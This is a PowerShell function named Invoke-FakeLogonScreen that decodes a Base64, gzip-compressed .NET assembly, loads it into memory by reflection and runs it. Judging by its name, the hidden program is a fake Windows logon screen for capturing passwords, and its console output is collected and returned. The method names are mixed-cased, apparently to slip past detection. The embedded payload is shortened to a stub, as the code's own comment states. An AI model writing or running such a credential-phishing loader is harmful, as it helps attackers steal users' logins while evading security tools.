function Invoke-FakeLogonScreen
{
    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIAAAAAAAEAO29B1h...jP+hTb/qxr/pPtl4wAiQnmzcb1Q78J9f2eLfUnYz+9+o8/9f/5+5/heK5QUvAG4AAA==")) # NOTE: The actual 24904-character Base64 string omitted for readability.
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    [FakeLogonScreen.Program]::Main()
    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}